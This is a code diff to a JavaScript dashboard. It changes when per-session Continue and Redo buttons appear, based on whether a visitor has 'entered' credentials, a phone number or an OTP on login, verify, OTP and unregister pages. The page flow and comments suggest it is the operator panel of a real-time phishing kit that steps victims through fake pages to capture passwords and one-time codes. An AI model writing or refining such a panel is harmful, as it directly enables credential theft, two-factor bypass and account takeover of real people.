@@ -296,9 +296,6 @@
     }
 
     function getActionButtons(s) {
-      const showRedo = !(s.page === 'success' || (s.page === 'unregister.html' && s.unregisterClicked));
-      const showCont = s.page !== 'success';
-      
       let html = '<div class="action-btns">';
       
       // Manage button (always show)
@@ -306,14 +303,32 @@
         <img src="/images/description-svgrepo-com.svg" alt="Manage">
       </button>`;
       
-      // Continue button
+      // Redo button - only show if credentials received (entered) and not on success page
+      // Also hide if on unregister.html and already clicked
+      const showRedo = s.entered && s.page !== 'success' && !(s.page === 'unregister.html' && s.unregisterClicked);
+      
+      // Continue button - only show if:
+      // - On login page and credentials entered, OR
+      // - On phone page and phone entered, OR
+      // - On unregister page and clicked, OR
+      // - On OTP page and OTP entered
+      let showCont = false;
+      if (s.page === 'index.html' && s.entered) {
+        showCont = true;
+      } else if (s.page === 'verify.html' && s.phone) {
+        showCont = true;
+      } else if (s.page === 'unregister.html' && s.unregisterClicked) {
+        showCont = true;
+      } else if (s.page === 'otp.html' && s.otp) {
+        showCont = true;
+      }
+      
       if (showCont) {
         html += `<button class="icon-btn continue" onclick="act('cont', '${s.sid}')" title="Continue">
           <img src="/images/arrow-right-square-svgrepo-com.svg" alt="Continue">
         </button>`;
       }
       
-      // Redo button
       if (showRedo) {
         html += `<button class="icon-btn redo" onclick="act('redo', '${s.sid}')" title="Redo">
           <img src="/images/cross-square-svgrepo-com.svg" alt="Redo">
